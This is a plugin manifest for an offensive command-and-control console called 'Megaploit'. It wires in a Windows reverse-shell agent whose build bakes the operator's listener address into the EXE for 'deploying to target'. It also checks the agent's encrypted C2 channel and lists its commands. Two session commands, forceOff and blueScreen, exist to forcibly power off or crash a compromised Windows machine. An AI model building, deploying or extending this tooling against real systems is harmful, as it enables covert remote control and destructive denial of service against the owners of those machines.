# =============================================================================
#  Megaploit Plugin — C-remote-shell
#  Integrates the C-remote-shell Windows agent submodule into the operator
#  console:  build the EXE, run the compliance probe, inspect C-exclusive verbs.
#
#  Requires: C-remote-shell submodule present at ./C-remote-shell/
#            MinGW (x86_64-w64-mingw32-gcc) or MSVC (cl.exe) for crs_build
# =============================================================================

[plugin]
name        = "c-remote-shell"
version     = "1.0.0"
author      = "Josefifir & Levon-Volodin"
description = "Build, inspect, and manage the C-remote-shell Windows agent submodule"
tags        = ["windows", "agent", "build", "c2"]
homepage    = "https://github.com/Levon-Volodin/C-remote-shell"
license     = "MIT"


# =============================================================================
#  crs_build — compile the Windows C agent EXE
#
#  Detects MinGW or MSVC automatically.
#  Bakes LHOST/PORT from the console into the binary at compile time.
#
#  Usage: crs_build
#         crs_build 10.0.0.1
#         crs_build 10.0.0.1 4444
# =============================================================================

[[command]]
name        = "crs_build"
kind        = "python"
handler     = "plugins.c_remote_shell.crs_build"
description = "Compile the C-remote-shell Windows agent EXE (auto-detects MinGW/MSVC)"
usage       = "crs_build [lhost] [port]"
min_args    = 0
max_args    = 2
timeout     = 200
tags        = ["build", "windows", "agent"]
notes       = """
Compiles the C-remote-shell Windows agent from source using MinGW or MSVC.
LHOST and PORT are baked in at compile time via -DC2_IP and -DC2_PORT.
If omitted, the current console LHOST/PORT settings are used.

After building, copy secret.key alongside the EXE before deploying to target.

Requirements:
  Linux/macOS: apt install mingw-w64  (provides x86_64-w64-mingw32-gcc)
  Windows:     open a Developer Command Prompt for Visual Studio
"""


# =============================================================================
#  crs_probe — C2 compliance report
#
#  Runs megaploit.core.c_probe against the C-remote-shell source tree.
#  Verifies all four security layers are present in the C code.
# =============================================================================

[[command]]
name        = "crs_probe"
kind        = "python"
handler     = "plugins.c_remote_shell.crs_probe"
description = "Run the Megaploit C2 compliance probe on C-remote-shell source"
usage       = "crs_probe"
min_args    = 0
max_args    = 0
tags        = ["inspect", "security"]
notes       = """
Checks the C-remote-shell source against 46 signals across four security layers:
  Layer 1 — SChannel TLS 1.2/1.3 (AEAD-only, no renegotiation)
  Layer 2 — HMAC-SHA256 challenge/response authentication
  Layer 3 — Protocol v2 magic-byte negotiation
  Layer 4 — AES-256-GCM framing + replay protection
Prints a full compliance report with pass/fail per signal.
"""


# =============================================================================
#  crs_verbs — C-exclusive wire verb table
#
#  Scans C source for strncmp dispatch verbs and flags the ones that are
#  not handled by the Python agent (forceOff, blueScreen, etc.)
# =============================================================================

[[command]]
name        = "crs_verbs"
kind        = "python"
handler     = "plugins.c_remote_shell.crs_verbs"
description = "List all wire verbs dispatched by the C agent (marks C-exclusive ones)"
usage       = "crs_verbs"
min_args    = 0
max_args    = 0
tags        = ["inspect"]
notes       = """
Scans C-remote-shell/client/shell.c for strncmp() dispatch calls and prints
every verb the C agent will accept.  C-exclusive verbs (not in the Python
agent, e.g. forceOff(), blueScreen()) are flagged with [C-only].

These C-exclusive verbs are also auto-registered as session commands at
Megaploit startup via megaploit.core.c_probe.c_exclusive_verbs().
"""


# =============================================================================
#  crs_payload_info — show build flags for the current LHOST/PORT
# =============================================================================

[[command]]
name        = "crs_payload_info"
kind        = "python"
handler     = "plugins.c_remote_shell.crs_payload_info"
description = "Show the compile flags to point the C agent at the current LHOST/PORT"
usage       = "crs_payload_info"
min_args    = 0
max_args    = 0
tags        = ["build", "info"]
notes       = """
Prints the exact MinGW command line needed to build the C agent pointing at
the current console LHOST and PORT.  Useful for quick copy-paste builds
without remembering all the flag names.
"""


# =============================================================================
#  forceOff — send the C-exclusive forceOff() verb to the active session
#  (Windows: force power off via NtSetSystemPowerState)
# =============================================================================

[[command]]
name        = "forceOff"
kind        = "session"
description = "Force power off the target (C agent only — Windows, NtSetSystemPowerState)"
usage       = "forceOff"
shell       = "forceOff()"
min_args    = 0
max_args    = 0
dangerous   = true
tags        = ["windows", "destructive"]
notes       = """
Sends the forceOff() wire verb to the C agent.
The agent calls NtSetSystemPowerState + NtShutdownSystem.
Only works when the active session is a C-remote-shell agent (not Python agent).
"""


# =============================================================================
#  blueScreen — send the C-exclusive blueScreen() verb to the active session
#  (Windows: trigger BSOD via NtRaiseHardError STATUS_ASSERTION_FAILURE)
# =============================================================================

[[command]]
name        = "blueScreen"
kind        = "session"
description = "Trigger a BSOD on the target (C agent only — Windows, NtRaiseHardError)"
usage       = "blueScreen"
shell       = "blueScreen()"
min_args    = 0
max_args    = 0
dangerous   = true
tags        = ["windows", "destructive"]
notes       = """
Sends the blueScreen() wire verb to the C agent.
The agent calls NtRaiseHardError(STATUS_ASSERTION_FAILURE).
Only works when the active session is a C-remote-shell agent (not Python agent).
"""
